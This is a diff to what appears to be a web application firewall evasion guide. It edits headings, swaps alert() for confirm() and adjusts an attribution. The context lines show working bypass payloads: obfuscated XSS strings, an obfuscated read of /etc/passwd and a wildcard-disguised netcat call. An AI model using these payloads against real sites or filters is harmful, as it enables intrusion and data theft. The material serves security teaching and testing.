@@ -2349,7 +2349,7 @@ __Standard__: `/bin/nc 127.0.0.1 1337`
 __Obfuscated__: `/???/n? 2130706433 1337`  
 Used chars: `/ ? n [0-9]`
 
-__9. String Concatenation__
+__9. Dynamic Payload Generation__
 - Different programming languages have different syntaxes and patterns for concatenation.
 - This allows us to effectively generate payloads that can bypass many filters and rules.
 
@@ -2363,7 +2363,7 @@ __Obfuscated__: `/bi'n'''/c''at' /e'tc'/pa''ss'wd`
 __Standard__: `<iframe/onload='this["src"]="javascript:alert()"';>`  
 __Obfuscated__: `<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>`
 
-__9. Junk Chars__
+__9. Junk Characters__
 - Normal payloads get filtered out easily.
 - Adding some junk chars helps avoid detection (specific cases only).
 - They often help in confusing regex based firewalls.
@@ -2382,8 +2382,8 @@ __10. Line Breaks__
 - Many WAF with regex based filtering effectively blocks many attempts.
 - Line breaks (CR/LF) can break firewall regex and bypass stuff.
 
-__Standard__: `<iframe src=javascript:alert(0)">`  
-__Obfuscated__: `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">`
+__Standard__: `<iframe src=javascript:confirm(0)">`  
+__Obfuscated__: `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)">`
 
 __11. Uninitialized Variables__
 - Uninitialized bash variables can evade bad regular expression based filters and pattern match.
@@ -2420,7 +2420,7 @@ __Variant__: `<IMG SRC="    jav    ascri    pt:alert    ();">`
 __Standard__: `<iframe src=javascript:alert(1)></iframe>`  
 __Obfuscated__: 
 ```
-<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<iframe    src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 ```
 
 __13. Obfuscation in Other Formats__  
@@ -2694,7 +2694,7 @@ GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&co
 Host: favoritewaf.com
 User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 ```
-- XSS Bypass by [0xInfection](https://twitter.com/0xInfection)
+- XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
 ```
 <a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
 ```
